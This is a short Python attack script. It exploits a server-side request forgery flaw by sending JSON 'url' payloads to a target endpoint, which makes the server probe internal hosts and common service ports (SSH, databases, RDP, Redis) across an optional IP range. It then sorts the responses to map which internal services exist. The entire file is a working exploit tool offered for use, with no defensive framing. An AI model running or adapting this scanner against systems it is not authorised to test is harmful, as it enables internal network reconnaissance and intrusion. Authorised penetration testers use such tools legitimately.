#!/usr/bin/python

import argparse
import requests
import time

# Define the list of ports to check
ports = ['22', '80', '443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379', '8000', '8001', '8055', '8080', '8443', '9000']

# Define the payload template as a string
payload_template = '{{"url":"http://{host}:{port}/"}}'

# Define the proxies to use
proxies = {'http': 'http://127.0.0.1:8080'}

# Set up the argument parser
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Target URL", required=True)
parser.add_argument("-s", "--ssrf", help="SSRF target host", required=True)
parser.add_argument("-i", "--iprange", help="IP range in CIDR format (optional)")
parser.add_argument("-v", "--verbose", help="Enable verbose mode", action="store_true", default=False)
args = parser.parse_args()

# Function to generate IP range
def generate_ip_range(iprange):
    from ipaddress import ip_network
    return [str(ip) for ip in ip_network(iprange)]

# Function to scan ports for a given host
def scan_ports(host):
    with requests.Session() as session:
        for port in ports:
            payload = payload_template.format(host=host, port=port)
            try:
                res = session.post(url=args.target, data=payload, headers={'Content-Type': 'application/json'}, proxies=proxies)
                time.sleep(0.2)
                if args.verbose:
                    print(f"Scanning {host}:{port}...")

                if '"code":"INTERNAL_SERVER_ERROR"' in res.text:
                    print(f"{host}:{port}   INTERNAL_SERVER_ERROR")
                elif '"code":"FORBIDDEN"' in res.text:
                    print(f"{host}:{port}   FORBIDDEN")
                else:
                    print(res.text)
            except requests.RequestException as e:
                print(f"Error scanning {host}:{port}: {e}")

if args.iprange:
    # Generate the list of IPs from the given range
    ip_list = generate_ip_range(args.iprange)
else:
    # If no IP range is provided, use the single SSRF host
    ip_list = [args.ssrf]

# Scan the ports for each IP in the list
for ip in ip_list:
    scan_ports(ip)
